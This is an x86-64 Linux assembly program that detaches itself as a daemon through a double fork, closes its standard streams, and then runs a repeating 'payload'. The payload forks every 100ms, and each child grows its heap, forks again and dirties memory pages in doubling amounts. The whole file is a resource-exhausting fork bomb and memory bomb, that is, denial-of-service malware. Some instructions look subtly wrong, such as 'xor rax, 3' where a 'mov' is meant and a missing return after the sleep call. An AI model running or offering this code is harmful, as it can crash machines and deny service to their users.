section .data
s dq 0
ns dq 100000000 ;100ms

section .text
global _start

exit:
    ;exit
    mov rax, 60
    xor rdi, rdi
    syscall

fork:
    ;fork
    mov rax, 57
    syscall 
    ret

sleep:
    ;nanosleep
    mov rax, 35
    mov rdi, s
    xor rsi, rsi
    syscall

waitforpid:
	pop rbx
	pop rdi 
	push rbx

	;wait4
	mov rax, 61
	;rdi is set to pid
	xor rsi, rsi
	xor rdx, rdx
	xor r10, r10
	syscall
	ret

_start:

	;fork
	mov rax, 57
	syscall
	test rax, rax
	jz next ;child continues
	;if parent

	push rax ;push pid
	call waitforpid
	jmp spinlock ;keep the parent idle and hooded to the terminal

	next:
	;fork
	mov rax, 57
	syscall
	test rax, rax
	jnz exit ;parent (1st child goes bye byem grandchild continues as daemon)

	;deamon starts here
daemon_init:

	;setpgid
	mov rax, 109
	xor rdi, rdi
	xor rsi, rsi
	syscall

	;close
	xor rax, 3
	mov rdi, 0
	syscall

	;close
	xor rax, 3
	mov rdi, 1
	syscall

	;close
	xor rax, 3
	mov rdi, 2
	syscall

	jmp daemon_start

spinlock:
	mov rax, 35
	mov rdi, s
	xor rsi, rsi
	syscall
	jmp spinlock

;payload starts here
daemon_start:

    call fork
	test rax, rax
	jz seeder_init

	call sleep
	jmp daemon_start

;seeder code start here
seeder_init:	
	;brk
    mov rax, 12
    xor rdi, rdi
    syscall

    mov rbx, rax ; get current state
    mov r12, 1024*1024 ;1M

seeder_start:
    ;brk
    mov rax, 12
    lea rdi, [rbx+r12]
    syscall

    call fork;daemonfork
    test rax, rax
    jnz seeder_start

    ;dirty pages
    mov rcx, r12
    shr rcx, 10 ; /1024 ergo how manny kb
	lop:
    mov rax, rcx
    shl rax, 10 ;rax = rcx*1024
    dec rax
    mov byte [rbx+rax], 0
    loop lop

    shl r12, 1 ;double page size

    jmp seeder_start